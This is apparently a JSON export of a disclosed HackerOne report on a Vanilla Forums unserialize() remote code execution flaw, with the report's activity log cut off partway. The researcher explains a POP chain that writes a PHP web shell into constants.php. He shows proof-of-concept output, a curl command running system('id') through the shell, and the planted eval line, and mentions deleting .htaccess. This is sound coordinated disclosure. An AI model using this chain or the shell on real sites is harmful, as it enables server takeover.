@@ -1,0 +1,506 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-10-24T15:47:07.028Z", 
+    "voters": [
+        "irek", 
+        "spam404", 
+        "inhibitor181", 
+        "eveeez", 
+        "sasi2103", 
+        "ahiezer", 
+        "babayaga_", 
+        "mygf", 
+        "cyberunit", 
+        "silv3rpoision", 
+        "and 11 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "600.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 407552, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "**Summary:**\n\nAn authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution.\n\n**Description:**\n\nPlease bare with me on this one, it's heavy. Ok, so after setting a Garden.TouchIcon setting (it can be several settings, this is just an example of one) we can reach an the code in renderMaster inside of the library/core/class.controller.php file.\n\n```\nclass Gdn_Controller extends Gdn_Pluggable {\n\n    ...\n\n    public function renderMaster() {\n        // Build the master view if necessary\n        if (in_array($this->_DeliveryType, [DELIVERY_TYPE_ALL])) {\n\n        ...\n\n            $touchIcon = c('Garden.TouchIcon');                                     // 1\n            if ($touchIcon) {\n                $this->Head->setTouchIcon(Gdn_Upload::url($touchIcon));\n            }\n```\n\nAt [1] we see a call to the function c(). As it turns out, that function is just a macro for the call in library/core/functions.general.php\n\n```\nif (!function_exists('config')) {\n    /**\n     * Retrieves a configuration setting.\n     *\n     * @param string|bool $name The name of the configuration setting.\n     * Settings in different sections are separated by dots.\n     * @param mixed $default The result to return if the configuration setting is not found.\n     * @return mixed The configuration setting.\n     * @see Gdn::config()\n     */\n    function config($name = false, $default = false) {                              // 2\n        return Gdn::config($name, $default);\n    }\n}\n```\n\nAt [2] we see the call to Gdn::config which is using the 'Garden.TouchIcon' setting. This function is defined in library/core/class.gdn.php.\n\n```\nclass Gdn {\n\n    ...\n\n    /**\n     * Get a configuration setting for the application.\n     *\n     * @param string $name The name of the configuration setting. Settings in different sections are seperated by a dot ('.')\n     * @param mixed $default The result to return if the configuration setting is not found.\n     * @return Gdn_Configuration|mixed The configuration setting.\n     */\n    public static function config($name = false, $default = false) {\n        if (self::$_Config === null) {\n            self::$_Config = static::getContainer()->get(self::AliasConfig);\n        }\n        $config = self::$_Config;\n        if ($name === false) {\n            $result = $config;\n        } else {\n            $result = $config->get($name, $default);        // 3\n        }\n\n        return $result;\n    }\n```\n\nAt [3] the code calls get() on the Gdn_Configuration class using using the 'Garden.TouchIcon'. This code is defined in library/core/class.configuration.php:\n\n```\nclass Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    public function get($name, $defaultValue = false) {\n        // Shortcut, get the whole config\n        if ($name == '.') {\n            return $this->Data;\n        }\n\n        $keys = explode('.', $name);\n        // If splitting is off, HANDLE IT\n        if (!$this->splitting) {\n//         $FirstKey = getValue(0, $Keys);\n            $firstKey = $keys[0];\n            if ($firstKey == $this->defaultGroup) {\n                $keys = [array_shift($keys), implode('.', $keys)];\n            } else {\n                $keys = [$name];\n            }\n        }\n        $keyCount = count($keys);\n\n        $value = $this->Data;\n        for ($i = 0; $i < $keyCount; ++$i) {\n            if (is_array($value) && array_key_exists($keys[$i], $value)) {\n                $value = $value[$keys[$i]];\n            } else {\n                return $defaultValue;\n            }\n        }\n\n        if (is_string($value)) {\n            $result = Gdn_Format::unserialize($value);                          // 4\n        } else {\n            $result = $value;\n        }\n\n        return $result;\n    }\n```\n\nAt [4] we can see the static call to unserialize in the Gdn_Format and as suspected, inside of library/core/class.format.php we can see the following code:\n\n```\nclass Gdn_Format {\n\n    ...\n\n    /**\n     * Takes a serialized variable and unserializes it back into its original state.\n     * \n     * @param string $serializedString A json or php serialized string to be unserialized.\n     * @return mixed\n     */\n    public static function unserialize($serializedString) {\n        $result = $serializedString;\n\n        if (is_string($serializedString)) {\n            if (substr_compare('a:', $serializedString, 0, 2) === 0 || substr_compare('O:', $serializedString, 0, 2) === 0) {\n                $result = unserialize($serializedString);                          // 5\n            } elseif (substr_compare('obj:', $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), false);\n            } elseif (substr_compare('arr:', $serializedString, 0, 4) === 0) {\n                $result = json_decode(substr($serializedString, 4), true);\n            }\n        }\n        return $result;\n    }\n```\n\nAt [5] we can reach the vulnerable unserialize with attacker controlled input\n\nExploitation:\n=============\n\nOf course, theory is great but poc||gtfo? Well, as it turns out, there are a few options for us to pick from.\n\nsaturn:vanilla mr_me$ grep --color=always -ir \"__destruct\" .\n./library/database/class.dataset.php:    public function __destruct() {\n./library/core/class.proxyrequest.php:    public function __destruct() {\n./library/core/class.configuration.php:    public function __destruct() {\n\nThe Gdn_DataSet class is useless to us, however the ProxyRequest class seems a little bit more interesting: \n\n```\nclass ProxyRequest {\n\n    ...\n\n    public function __destruct() {\n        if (file_exists($this->CookieJar)) {\n            unlink($this->CookieJar);\n        }\n    }\n```\n\nThis can of course allow us to delete files from the remote system. Be careful here, as attackers can wipe the .htaccess files and weaken the security posture of the application. However, the prime candidate is RCE, so we opted for the next class, the Gdn_Configuration class of course! (how meta).\n\nOk so life is born in Gdn_Configuration's __destruct:\n\n```\nclass Gdn_Configuration extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     */\n    public function __destruct() {\n        if ($this->autoSave) {                      // 1\n            $this->shutdown();                      // 2\n        }\n    }\n\n    /**\n     *\n     */\n    public function shutdown() {\n        foreach ($this->sources as $source) {\n            $source->shutdown();                    // 3\n        }\n    }\n```\n\nWe can reach the shutdown() call at [2] if we set the autoSave property at [1]. Then at [3] we can call shutdown again, but on a different class, presumably the Gdn_ConfigurationSource class.\n\n```\nclass Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     *\n     * @throws Exception\n     */\n    public function shutdown() {\n        if ($this->Dirty) {                 // 4\n            $this->save();                  // 5\n        }\n    }\n```\n\nWe can reach the save() call at [5] by setting the dirty property at [4].\n\n```\nclass Gdn_ConfigurationSource extends Gdn_Pluggable {\n\n    ...\n\n    /**\n     *\n     * \n     * @return bool|null\n     * @throws Exception\n     */\n    public function save() {\n        if (!$this->Dirty) {\n            return null;\n        }\n\n        $this->EventArguments['ConfigDirty'] = &$this->Dirty;\n        $this->EventArguments['ConfigNoSave'] = false;\n        $this->EventArguments['ConfigType'] = $this->Type;\n        $this->EventArguments['ConfigSource'] = $this->Source;\n        $this->EventArguments['ConfigData'] = $this->Settings;\n        $this->fireEvent('BeforeSave');\n\n        if ($this->EventArguments['ConfigNoSave']) {\n            $this->Dirty = false;\n            return true;\n        }\n\n        // Check for and fire callback if one exists\n        if ($this->Callback && is_callable($this->Callback)) {\n            $callbackOptions = [];\n            if (!is_array($this->CallbackOptions)) {\n                $this->CallbackOptions = [];\n            }\n\n            $callbackOptions = array_merge($callbackOptions, $this->CallbackOptions, [\n                'ConfigDirty' => $this->Dirty,\n                'ConfigType' => $this->Type,\n                'ConfigSource' => $this->Source,\n                'ConfigData' => $this->Settings,\n                'SourceObject' => $this\n            ]);\n\n            $configSaved = call_user_func($this->Callback, $callbackOptions);\n\n            if ($configSaved) {\n                $this->Dirty = false;\n                return true;\n            }\n        }\n\n        switch ($this->Type) {                              // 6\n            case 'file':\n                if (empty($this->Source)) {\n                    trigger_error(errorMessage('You must specify a file path to be saved.', 'Configuration', 'Save'), E_USER_ERROR);\n                }\n\n                $checkWrite = $this->Source;\n                if (!file_exists($checkWrite)) {\n                    $checkWrite = dirname($checkWrite);\n                }\n\n                if (!is_writable($checkWrite)) {\n                    throw new Exception(sprintf(t(\"Unable to write to config file '%s' when saving.\"), $this->Source));\n                }\n\n                $group = $this->Group;                                                              // 7\n                $data = &$this->Settings;\n                if ($this->Configuration) {\n                    ksort($data, $this->Configuration->getSortFlag());\n                }\n\n                // Check for the case when the configuration is the group.\n                if (is_array($data) && count($data) == 1 && array_key_exists($group, $data)) {\n                    $data = $data[$group];\n                }\n\n                // Do a sanity check on the config save.\n                if ($this->Source == Gdn::config()->defaultPath()) {\n                    // Log root config changes\n                    try {\n                        $logData = $this->Initial;\n                        $logData['_New'] = $this->Settings;\n                        LogModel::insert('Edit', 'Configuration', $logData);\n                    } catch (Exception $ex) {\n                    }\n\n                    if (!isset($data['Database'])) {\n                        if ($pm = Gdn::pluginManager()) {\n                            $pm->EventArguments['Data'] = $data;\n                            $pm->EventArguments['Backtrace'] = debug_backtrace();\n                            $pm->fireEvent('ConfigError');\n                        }\n                        return false;\n                    }\n                }\n\n                $options = [\n                    'VariableName' => $group,                                                   // 8\n                    'WrapPHP' => true,\n                    'ByLine' => true\n                ];\n\n                if ($this->Configuration) {\n                    $options = array_merge($options, $this->Configuration->getFormatOptions());             // 9\n                }\n\n                // Write config data to string format, ready for saving\n                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10\n\n                if ($fileContents === false) {\n                    trigger_error(errorMessage('Failed to define configuration file contents.', 'Configuration', 'Save'), E_USER_ERROR);\n                }\n\n                // Save to cache if we're into that sort of thing\n                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this->Source);\n                if ($this->Configuration && $this->Configuration->caching() && Gdn::cache()->type() == Gdn_Cache::CACHE_TYPE_MEMORY && Gdn::cache()->activeEnabled()) {\n                    $cachedConfigData = Gdn::cache()->store($fileKey, $data, [\n                        Gdn_Cache::FEATURE_NOPREFIX => true,\n                        Gdn_Cache::FEATURE_EXPIRY => 3600\n                    ]);\n                }\n\n                $tmpFile = tempnam(PATH_CONF, 'config');\n                $result = false;\n                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11\n                    chmod($tmpFile, 0775);\n                    $result = rename($tmpFile, $this->Source);                                              // 12\n                }\n```\n\nOk so at [6] we trigger a switch statement and want to land into the 'file' block. Then at [7] we want to set `$group` from `$this->Group` to some PHP code. This will become apparent soon.\n\nThen at [8] we set `$options` to be an associative array containing our controlled `$group` at 'VariableName'. At [9] that array is merged with another array and then at [10] a call to format() is made. This has been excluded from the analysis but essentially, we can set a global variable in there using our controlled 'VariableName' value.\n\nNow after [10] we have our PHP code in `$fileContents` is then placed into a random file in the config directory at [11]. Finally, at [12] the random file is renamed to the attackers supplied filename using `$this->Source`.\n\nThis can allow remote code execution. In the exploit, I choose to use 'constants.php' as a target for a few reasons:\n\n1. We have a \"show stopper\" as its know, which is `if (!defined('APPLICATION')) exit();`. This wont allow us to execute PHP code directly\n   even if we delete the .htaccess using the other potential pop chain.\n\n   This contants.php file is included into the web root of the application, so we can execute the injected PHP code from the index page.\n\n2. The config folder is naturally writable due to the caching in the same directory and that the code contantantly (pun intended) updates the config.php file.\n\nRemember to snapshot or backup your installation before running this exploit. It DOES NOT attempt to clean up after exploitation.\n\n## Example:\n\n```\nsaturn:~ mr_me$ ./poc.py \n(+) usage: poc.py <target> <cookie>\n(+) eg: poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n\nsaturn:~ mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n(+) targeting: http://172.16.175.143\n(+) shell injected into contants.php successfully!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\" | cut -d \"<\" -f1\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the target system:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n<?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-08 20:35:19\n```\n\n## Steps to reproduce:\n\n1. Backup your installation.\n2. Login as an admin and get the Vanilla cookie\n3. Run the poc against your target with the cookie.\n\n## Anything else we should know?\n\nGive me a few days and I'll write you a patch. Basically you just need a `__wakeUp` call in the Gdn_Configuration class.\n\n## Impact\n\nHigh, RCE.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "high", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "high", 
+            "availability": "high"
+        }, 
+        "rating": "critical", 
+        "score": 9.1, 
+        "author_type": "Team"
+    }, 
+    "title": "Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability", 
+    "is_member_of_team?": null, 
+    "vote_count": 21, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 10346, 
+            "content": "An authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution leveraging a custom pop chain.", 
+            "content_html": "<p>An authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution leveraging a custom pop chain.</p>\n"
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "*.vanillaforums.com", 
+        "max_severity": "critical", 
+        "databaseId": 2101, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2018-11-23T15:47:07.080Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$600", 
+    "attachments": [
+        {
+            "file_name": "Screen_Shot_2018-09-08_at_3.49.17_PM.png", 
+            "type": "image/png", 
+            "id": 343923, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/343/923/e8dca2698d64c8f29ff27d252a80004bce0098ff/Screen_Shot_2018-09-08_at_3.49.17_PM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221402Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f238614df945776330bcdafb6094358bc40aa7e8c880ffecb23fb3aa4a691972"
+        }, 
+        {
+            "file_name": "poc.py", 
+            "type": "text/x-python", 
+            "id": 343924, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/343/924/9fba8618a0bcc4d7ec1be3be30d210fd6efa4caf/poc.py?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221402Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9a35e9b1afa07a30f045faa9716cbd3f049287b55edc8506613722bc7e52be28"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-08T21:58:22.899Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-08T21:58:22.899Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Reproducible: Yes, please see poc.py\nImpact: High, RCE\nIn Scope: Yes", 
+            "markdown_message": "<p>Reproducible: Yes, please see poc.py<br>\nImpact: High, RCE<br>\nIn Scope: Yes</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3311550, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-09T08:57:06.260Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-09T08:57:06.260Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Sorry, I made a few typos because I posted it between flights. But if your confused with anything, just let me know and I\u2019ll update the report.", 
+            "markdown_message": "<p>Sorry, I made a few typos because I posted it between flights. But if your confused with anything, just let me know and I\u2019ll update the report.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3312890, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-09T17:00:12.596Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-09T17:00:12.596Z", 
+            "actor": {
+                "username": "dexterr", 
+                "url": "/dexterr", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/201/201/63b60a565fa550165cfe08c9d9739c7f02712a73_medium.png?1522156506"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Hi there mr_me, We will look into this tomorrow, and give you a feedback accordingly.\nThank you.", 
+            "markdown_message": "<p>Hi there mr_me, We will look into this tomorrow, and give you a feedback accordingly.<br>\nThank you.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3313528, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-13T15:54:07.882Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-13T15:54:07.882Z", 
+            "actor": {
+                "username": "linc", 
+                "url": "/linc", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/136/045/e6bae7f9edf6940a514d48d769422c229000d3aa_medium.png?1495575265"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical (9.9)", 
+                "old_severity": "High (8.8)"
+            }, 
+            "team_handle": "vanilla", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 3333110, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-13T15:55:10.328Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-13T15:55:10.328Z", 
+            "actor": {
+                "username": "topcheese", 
+                "url": "/topcheese", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/288/788/e36219cfa28890457c94e348b572bb016c511b25_medium.jpeg?1529326553"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical (9.9)", 
+                "old_severity": "Critical (9.9)"
+            }, 
+            "team_handle": "vanilla", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 3333118, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/345/954/130dbb916925e0a41d906fe28c9707898f3980fb/pop.php?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221402Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=923c2559d8faf3658d1b3a58651add20583c9bd36df3224b542212f4dd1f332e", 
+                    "type": "text/x-php", 
+                    "id": 345954, 
+                    "filename": "pop.php"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-09-13T18:55:25.727Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-13T18:55:25.727Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Also, here is the pop chain in its native form.", 
+            "markdown_message": "<p>Also, here is the pop chain in its native form.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3333796, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-13T19:45:48.556Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-13T19:45:48.556Z", 
+            "actor": {
+                "username": "topcheese", 
+                "url": "/topcheese", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/288/788/e36219cfa28890457c94e348b572bb016c511b25_medium.jpeg?1529326553"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 3333982, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-14T13:59:29.411Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-14T13:59:29.411Z", 
+            "actor": {
+                "username": "tburry", 
+                "url": "/tburry", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/190/499/1d442d7583b0a03d8c33c6c6a22e3156846e1d5e_medium.jpg?1502301205"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Critical (9.1)", 
+                "old_severity": "Critical (9.9)"
+            }, 
+            "team_handle": "vanilla", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 3337974, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-09-19T12:27:11.275Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T12:27:11.275Z", 
+            "actor": {
+                "url": "/vanilla", 
+                "profile": {
+                    "name": "Vanilla"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/443/305c2a7379725cdd5a45ac498670186a9d8d2c16_medium.png?1519846664"
+                }
+            }, 
+            "team_handle": "vanilla", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "600.0", 
+            "collaborator": {
+                "username": "mr_me", 
+                "url": "/mr_me"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 3358073, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-19T13:45:02.489Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-19T13:45:02.489Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/041/443/1d895fb5ebd380a050d2d3e170729b5a72fb1379_medium.jpg?1472495053"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Thanks!", 
+            "markdown_message": "<p>Thanks!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3358407, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "mr_me", 
+                "url": "/mr_me"
+            }, 
+            "created_at": "2018-09-23T23:39:31.457Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-23T23:39:31.457Z", 
+            "actor": {
+                "username": "linc", 
+                "url": "/linc", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/136/045/e6bae7f9edf6940a514d48d769422c229000d3aa_medium.png?1495575265"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "vanilla", 
+            "message": "Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.", 
+            "markdown_message": "<p>Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 3376859, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-10-24T15:47:07.052Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-10-24T15:47:07.052Z", 
+            "actor": {
+                "username": "mr_me", 
+                "url": "/mr_me", 
